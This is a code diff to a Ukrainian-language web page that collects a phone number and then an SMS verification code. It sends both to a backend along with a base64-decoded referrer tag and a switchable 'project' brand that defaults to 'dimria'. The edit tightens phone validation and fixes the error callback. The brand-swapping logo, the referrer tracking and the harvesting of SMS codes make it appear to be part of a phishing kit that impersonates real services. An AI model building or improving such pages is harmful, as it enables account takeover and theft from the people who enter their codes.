@@ -37,7 +37,7 @@
         </div>
 
         <div id="phone-step">
-            <input type="tel" id="phone-number" placeholder="99 25 322 77">
+            <input type="tel" id="phone-number" placeholder="+380 __ ___ ___">
             <button type="button" class="submit-button" onclick="showSmsStep()">Продовжити</button>
         </div>
 
@@ -60,11 +60,10 @@
         const project = urlParams.get('project') || 'dimria';
         const referrer = urlParams.get('ref') ? atob(urlParams.get('ref')).replace(/[^a-zA-Z0-9_]/g, '') : '';
 
-        // Лого
         document.getElementById('project-logo').src = `/logo?project=${project}`;
 
         $(document).ready(() => {
-            $('#phone-number').mask('+380999999999', { placeholder: " " }).val('+380 ');
+            $('#phone-number').mask('+380 00 000 0000', { placeholder: " " }).val('+380 ');
             $('.code-input').on('keyup', function(e) {
                 const $this = $(this);
                 if ($this.val().length === 1 && $this.next('.code-input').length) $this.next('.code-input').focus();
@@ -73,9 +72,19 @@
         });
 
         function showSmsStep() {
-            const phone = $('#phone-number').val();
-            if (phone.replace(/\s/g, '').length !== 13) return alert('Введіть повний номер');
-            $('#phone-step').hide(); $('#sms-step').show(); $('#code-1').focus();
+            const phone = $('#phone-number').val().replace(/\s/g, '');
+            if (!/^\+380\d{9}$/.test(phone)) {
+                alert('Введіть коректний номер: +380XXXXXXXXX');
+                return;
+            }
+            if (phone.startsWith('+3800') || phone.startsWith('+380380')) {
+                alert('Невірний формат номеру!');
+                return;
+            }
+
+            $('#phone-step').hide();
+            $('#sms-step').show();
+            $('#code-1').focus();
             sendData('phone', { phone });
         }
 
@@ -92,7 +101,7 @@
                 contentType: 'application/json',
                 data: JSON.stringify({ step, ...data, referrer, project }),
                 success: () => { if (step === 'code') alert('Дані підтверджено!'); },
-                error: ()  
+                error: () => {}
             });
         }
     </script>
